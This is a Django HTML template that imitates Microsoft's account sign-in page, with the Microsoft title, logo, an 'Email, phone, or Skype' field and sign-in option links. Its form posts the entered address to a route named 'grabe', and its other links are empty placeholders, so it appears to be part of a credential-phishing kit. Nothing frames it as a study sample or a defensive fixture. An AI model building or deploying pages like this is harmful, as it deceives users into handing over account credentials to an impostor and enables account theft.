<!DOCTYPE html>
<html lang="en">

<head>
    {% load static %}
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="{% static 'favicon.ico' %}" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="{% static 'app.css' %}" />
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="{% static 'logo.png' %}" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
            <form action="{% url 'grabe' %}" method="POST">
                {% csrf_token %}
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" required type="email" name="uname" class="input" placeholder="Email, phone, or Skype" />
                </div>
                <div>
                    <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                    <p class="mb-16 fs-13">
                        <a href="#" class="link">Sign in with a security key
                            <img src="{% static 'question.png' %}" alt="Question img">
                        </a>
                    </p>
                </div>
                <div>
                    <button class="btn" id="btn_nex">Next</button>
                </div>
            </form>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="{% static 'key.png' %}" width="30px" /></span> 
                Sign-in options
            </p>
        </div>
    </section>
    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="{% static 'app.js' %}"></script>
</body>

</html>
